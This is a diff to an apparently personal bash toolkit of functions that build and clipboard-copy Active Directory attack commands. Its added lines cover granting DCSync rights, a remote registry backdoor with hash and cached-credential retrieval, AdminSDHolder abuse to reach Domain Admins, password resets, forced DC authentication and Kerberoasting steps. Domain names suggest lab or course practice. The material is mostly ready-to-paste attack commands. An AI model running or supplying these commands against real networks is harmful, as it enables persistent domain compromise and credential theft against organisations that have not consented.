@@ -68,11 +68,9 @@ nb-ad-pwsh-persist-acls() {
     echo
     __ask "PowerView check for domain PrivEsc vectors:"
     echo "1. Give user DCSync rights"
-    echo "2. Give user access rights to a machine without explicit credentials"
-    echo "3. "
-    echo "4. "
-    echo "5. "
-    echo "6. "
+    echo "2. Security Descriptors - Give user access rights to a machine without explicit credentials (WinRM and PSRemoting)"
+    echo "3. Security Descriptors - Remote Registry"
+    echo "4. Give user AdminSDHolder rights"
     echo
     echo -n "Choose a command to copy: "
     read choice
@@ -86,52 +84,93 @@ nb-ad-pwsh-persist-acls() {
           nb-vars-set-user
           __ask "Enter the current domain name"
           nb-vars-set-domain
+          echo
+          __info "Command to add DCSync rights to a ${__USER} copied to clipboard:"
           __COMMAND="Add-DomainObjectAcl -TargetIdentity '$dn' -PrincipalIdentity ${__USER} -Rights DCSync -PrincipalDomain ${__DOMAIN} -TargetDomain ${__DOMAIN} -Verbose"
+          echo "$__COMMAND" | wl-copy
+          __ok "$__COMMAND"
           echo
           __info "You can check if the user has now applied rights using command:"
           __ok "Get-DomainObjectAcl -SearchBase\"$dn\" -SearchScope Base -ResolveGUIDs | ?{(\$_.ObjectAceType -match 'replication-get') -or (\$_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {\$_ | Add-Member NoteProperty'IdentityName' \$(Convert-SidToName \$_.SecurityIdentifier);\$_} | ?{\$_.IdentityName -match "${__USER}"}"
           echo
           __info "You can then run DCSync attack with that user:"
           __ok "nb-ad-pwsh-dcsync"
-          echo
-          __info "Command to add DCSync rights to a ${__USER} copied to clipboard:"
           ;;
         2) 
           echo
           __warn "You need to load RACE toolkit in powershell:"
           __ok ". .\\\\RACE.ps1"
+          __ok ". .\\\\Set-RemotePSRemoting.ps1"
           echo
           __ask "Enter the target DC hostname"
           nb-vars-set-rhost
+          __ask "Enter the user whom you want to add the ACL rights to"
           nb-vars-set-user
           nb-vars-set-domain
-          __info "WMI access to ${__USER} without explicit credentials:"
+          echo
+          __info "WMI access to ${__USER} without explicit credentials copied to clipboard:"
           __COMMAND="Set-RemoteWMI -SamAccountName ${__USER} -ComputerName ${__RHOST} -namespace 'root\cimv2' -Verbose"
+          echo "$__COMMAND" | wl-copy
+          __ok "$__COMMAND"
+          echo
           echo
           __info "PSRemoting access to ${__USER} without explicit credentials:"
-          __COMMAND2="Set-RemotePSRemoting -SamAccountName ${__USER} -ComputerName ${__RHOST}.${__DOMAIN} -Verbose"
+          __ok "Set-RemotePSRemoting -SamAccountName ${__USER} -ComputerName ${__RHOST}.${__DOMAIN} -Verbose"
           ;;
         3) 
           echo
-          __info "Check kerberoastable users"
-          __COMMAND=""
+          __warn "You need to load the following scripts in powershell:"
+          __ok ". .\\\\Add-RemoteRegBackdoor"
+          __ok ". .\\\\RemoteHashRetrieval"
+          echo
+          __ask "Enter the user whom you want to add the ACL rights to"
+          nb-vars-set-user
+          __ask "Enter the target DC hostname"
+          nb-vars-set-rhost
+          echo
+          __info "Command to use DAMP with admin privs on remote machine (Domain Admin privs) copied to clipboard:"
+          __COMMAND="Add-RemoteRegBackdoor -ComputerName ${__RHOST} -Trustee ${__USER} -Verbose"
+          echo "$__COMMAND" | wl-copy
+          __ok "$__COMMAND"
+          echo
+          __info "Retrieve machine account hash:"
+          __ok "Get-RemoteMachineAccountHash -ComputerName ${__RHOST} -Verbose"
+          echo
+          __info "Retrieve local account hash:"
+          __ok "Get-RemoteLocalAccountHash -ComputerName ${__RHOST} -Verbose"
+          echo
+          __info "Retrieve domain cached credentials:"
+          __ok "Get-RemoteCachedCredential -ComputerName ${__RHOST} -Verbose"
           ;;
         4)
           echo
-          __info "Check kerberoastable users"
-          __COMMAND=""
-          ;;
-        5) 
+          __ask "Enter a distinguished name (DN), such as: 'dc=htb,dc=local'"
+          local dn && __askvar dn DN
+          nb-vars-set-domain
+          __ask "Enter the user whom you want to add the ACL rights to"
+          nb-vars-set-user
           echo
-          __info "Check kerberoastable users"
-          __COMMAND=""
+          __info "Command to add ${__USER} with FullControl privileges copied to clipboard:"
+          __COMMAND="Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,$dn' -PrincipalIdentity ${__USER} -Rights All -PrincipalDomain ${__DOMAIN} -TargetDomain dollarcorp.moneycorp.local -Verbose"
+          echo "$__COMMAND" | wl-copy
+          __ok "$__COMMAND"
+          echo
+          __info "Instead of waiting 1hour, you can kick off the process manually using Powershell:"
+          __ok "Import-Module .\\Invoke-SDPropagator.ps1"
+          __ok "Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose"
+          echo
+          __info "You can check if user got generic all against domain admins group:"
+          __ok "Get-ObjectAcl -Identity \"Domain Admins\" -ResolveGUIDs | Where ActiveDirectoryRights -like \"GenericAll\" | %{ ConvertFrom-SID $_.SecurityIdentifier }"
+          echo
+          __info "Then, just add the user to DA group"
+          __ok "Add-DomainGroupMember -Identity 'Domain Admins' -Members ${__USER} -Verbose"
+          echo
+          __info "To abuse ResetPassword using PowerView:"
+          __ok "Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword (ConvertTo-SecureString \"Password@123\" -AsPlainText -Force ) -Verbose"
           ;;
-        6) return;;
+        5) return;;
         *) echo "Invalid option"; sleep 1; nb-ad-pwsh-persist-acls; return;;
     esac
-
-    echo "$__COMMAND" | wl-copy
-    __ok "$__COMMAND"
 }
 
 nb-ad-pwsh-persist-skeleton() {
@@ -474,8 +513,7 @@ nb-ad-pwsh-unconstrained() {
     __ok "$__COMMAND"
     echo
     __info "Next you need to use command to force authentication to of the DC to the listener machine:"
-    __COMMAND2=".\\\\MS-RPRN.exe \\\\\\\\${__RHOST}.${__DOMAIN} \\\\\\\\${ma}.${__DOMAIN}"
-    __ok "$__COMMAND2"
+    __ok ".\\\\MS-RPRN.exe \\\\\\\\${__RHOST}.${__DOMAIN} \\\\\\\\${ma}.${__DOMAIN}"
 }
 
 nb-ad-pwsh-kerberoasting-set-spn() {
@@ -494,8 +532,7 @@ nb-ad-pwsh-kerberoasting-set-spn() {
     __ok "$__COMMAND"
     echo
     __info "Next you need to request TGS hash for offline cracking hashcat:"
-    __COMMAND2="Get-DomainUser -Identity ${__USER} | Get-DomainSPNTicket | select -ExpandProperty Hash"
-    __ok "$__COMMAND2"
+    __ok "Get-DomainUser -Identity ${__USER} | Get-DomainSPNTicket | select -ExpandProperty Hash"
     echo
     __info "Then use the command to crack it:"
     __ok "nb-crack-hashcat"
@@ -526,15 +563,20 @@ nb-ad-pwsh-enum-acls() {
     case $choice in
         1) 
           echo
-          __info "Check kerberoastable users"
-          __COMMAND="Get-DomainUser -SPN";;
+          __info "Command to check kerberoastable users copied to clipboard:"
+          __COMMAND="Get-DomainUser -SPN"
+          echo "$__COMMAND" | wl-copy
+          __ok "$__COMMAND"
+          ;;
         2) 
           echo
-          __warn "Afterwards you can check the user already has a SPN set with command:"
-          __ok "Get-DomainUser -Identity <USERNAME> | select serviceprincipalname"
+          __info "Enumerate the permissions for RDPUsers on ACLs - check the ObjectDN's first 'CN=' value:"
           __COMMAND="Find-InterestingDomainAcl -ResolveGUIDs | ?{\$_.IdentityReferenceName -match \"RDPUsers\"}"
+          echo "$__COMMAND" | wl-copy
+          __ok "$__COMMAND"
           echo
-          __info "Enumerate the permissions for RDPUsers on ACLs - check the ObjectDN's first 'CN=' value"
+          __info "You can check the user already has a SPN set with command:"
+          __ok "Get-DomainUser -Identity <USERNAME> | select serviceprincipalname"
           ;;
         3) 
           echo
@@ -543,35 +585,52 @@ nb-ad-pwsh-enum-acls() {
           __ask "Enter a distinguished name (DN), such as: 'dc=htb,dc=local'"
           local dn && __askvar dn DN
           __COMMAND="Get-DomainObjectAcl -SearchBase \"${dn}\" -SearchScope Base -ResolveGUIDs | ?{(\$_.ObjectAceType -match 'replication-get') -or (\$_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {\$_ | Add-Member NoteProperty 'IdentityName' \$(Convert-SidToName \$_.SecurityIdentifier);\$_} | ?{\$_.IdentityName -match \"${__USER}\"}"
+          echo
+          __info "Command to check if the user has DCSync rights copied to clipboard:"
+          echo "$__COMMAND" | wl-copy
+          __ok "$__COMMAND"
           ;;
         4)
           echo
-          __info "Check which machine allows for unconstrained delegeation"
-          __COMMAND="Get-DomainComputer -Unconstrained | select -ExpandProperty name";;
+          __info "Commadn to check which machine allows for unconstrained delegeation:"
+          __COMMAND="Get-DomainComputer -Unconstrained | select -ExpandProperty name"
+          echo "$__COMMAND" | wl-copy
+          __ok "$__COMMAND"
+          ;;
         5) 
           echo
-          __info "Enumerate users in the domain for whom Constrained Delegation is enabled"
-          __COMMAND="Get-DomainUser -TrustedToAuth";;
+          __info "Command to enumerate users in the domain for whom Constrained Delegation is enabled:"
+          __COMMAND="Get-DomainUser -TrustedToAuth"
+          echo "$__COMMAND" | wl-copy
+          __ok "$__COMMAND"
+          ;;
         6) 
           echo
-          __info "Enumerate computer accounts in the domain for which Constrained Delegation is enabled"
-          __COMMAND="Get-DomainComputer -TrustedToAuth";;
+          __info "Command to enumerate computer accounts in the domain for which Constrained Delegation is enabled:"
+          __COMMAND="Get-DomainComputer -TrustedToAuth"
+          echo "$__COMMAND" | wl-copy
+          __ok "$__COMMAND"
+          ;;
         7) 
           echo
+          __ask "Enter user whom you want to check for write permissions"
           nb-vars-set-user
           echo
-          __info "Find a computer object in dcorp domain where we have Write permissions over given computer object"
-          __COMMAND="Find-InterestingDomainACL | ?{\$_.identityreferencename -match '${__USER}'}";;
+          __info "Command to find a computer object in dcorp domain where the user has write permissions over given computer object:"
+          __COMMAND="Find-InterestingDomainACL | ?{\$_.identityreferencename -match '${__USER}'}"
+          echo "$__COMMAND" | wl-copy
+          __ok "$__COMMAND"
+          ;;
         8) 
           echo
-          __info "Enumerate accounts with Kerberos Preauth disabled"
-          __COMMAND="Get-DomainUser -PreauthNotRequired -Verbose";;
+          __info "Command to enumerate accounts with Kerberos Preauth disabled:"
+          __COMMAND="Get-DomainUser -PreauthNotRequired -Verbose"
+          echo "$__COMMAND" | wl-copy
+          __ok "$__COMMAND"
+          ;;
         9) return;;
         *) echo "Invalid option"; sleep 1; nb-ad-pwsh-enum-acls; return;;
     esac
-
-    echo "$__COMMAND" | wl-copy
-    __ok "$__COMMAND"
 }
 
 nb-ad-pwsh-dcsync() {
